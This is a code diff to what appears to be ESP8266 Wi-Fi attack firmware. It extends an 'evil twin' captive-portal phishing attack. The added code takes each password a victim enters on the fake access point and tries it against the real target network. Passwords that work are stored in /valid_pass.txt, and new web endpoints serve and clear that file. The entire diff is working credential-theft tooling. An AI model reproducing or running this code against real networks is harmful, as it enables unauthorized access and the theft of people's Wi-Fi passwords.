@@ -447,12 +447,61 @@ namespace wifi {
                 logFile.print("] IP: ");
                 logFile.print(clientIP);
                 logFile.print(" | Password: ");
-                logFile.println(password);
+                logFile.print(password);
+                
+                if (attack.isEvilTwinRunning()) {
+                    String targetSSID = attack.getEvilTwinTargetSSID();
+                    if (targetSSID.length() > 0) {
+                        logFile.print(" | Target: ");
+                        logFile.print(targetSSID);
+                        logFile.print(" | Validating...");
+                        
+                        Serial.print("=== VALIDATING PASSWORD ===");
+                        Serial.print("Target: " + targetSSID);
+                        Serial.print(" | Password: " + password);
+                        Serial.print(" | Trying...");
+                        
+                        WiFi.mode(WIFI_STA);
+                        WiFi.disconnect();
+                        delay(100);
+                        WiFi.begin((char*)targetSSID.c_str(), (char*)password.c_str());
+                        
+                        int waitCount = 0;
+                        bool connected = false;
+                        while (waitCount < 20) {
+                            if (WiFi.status() == WL_CONNECTED) {
+                                connected = true;
+                                break;
+                            }
+                            delay(500);
+                            waitCount++;
+                        }
+                        
+                        if (connected) {
+                            logFile.print(" [VALID!]");
+                            Serial.println(" VALID!");
+                            File validFile = LittleFS.open("/valid_pass.txt", "a");
+                            if (validFile) {
+                                validFile.print("[");
+                                validFile.print(millis());
+                                validFile.print("] SSID: ");
+                                validFile.print(targetSSID);
+                                validFile.print(" | Password: ");
+                                validFile.println(password);
+                                validFile.close();
+                            }
+                            WiFi.disconnect();
+                        } else {
+                            logFile.print(" [INVALID]");
+                            Serial.println(" INVALID");
+                            WiFi.disconnect();
+                        }
+                    }
+                }
+                
+                logFile.println();
                 logFile.close();
                 
-                Serial.println("=== EVIL TWIN CAPTURE ===");
-                Serial.println("IP: " + clientIP);
-                Serial.println("Password: " + password);
                 Serial.println("=========================");
             }
             
@@ -488,6 +537,29 @@ namespace wifi {
                 server.send(200, str(W_TXT), "Logs cleared");
             } else {
                 server.send(200, str(W_TXT), "No logs to clear");
+            }
+        });
+
+        server.on("/valid_pass.txt", HTTP_GET, []() {
+            if (LittleFS.exists("/valid_pass.txt")) {
+                File passFile = LittleFS.open("/valid_pass.txt", "r");
+                String content = "";
+                if (passFile) {
+                    content = passFile.readString();
+                    passFile.close();
+                }
+                server.send(200, str(W_TXT), content);
+            } else {
+                server.send(200, str(W_TXT), "No valid passwords yet");
+            }
+        });
+
+        server.on("/clear_valid", HTTP_GET, []() {
+            if (LittleFS.exists("/valid_pass.txt")) {
+                LittleFS.remove("/valid_pass.txt");
+                server.send(200, str(W_TXT), "Valid passwords cleared");
+            } else {
+                server.send(200, str(W_TXT), "No valid passwords to clear");
             }
         });
 
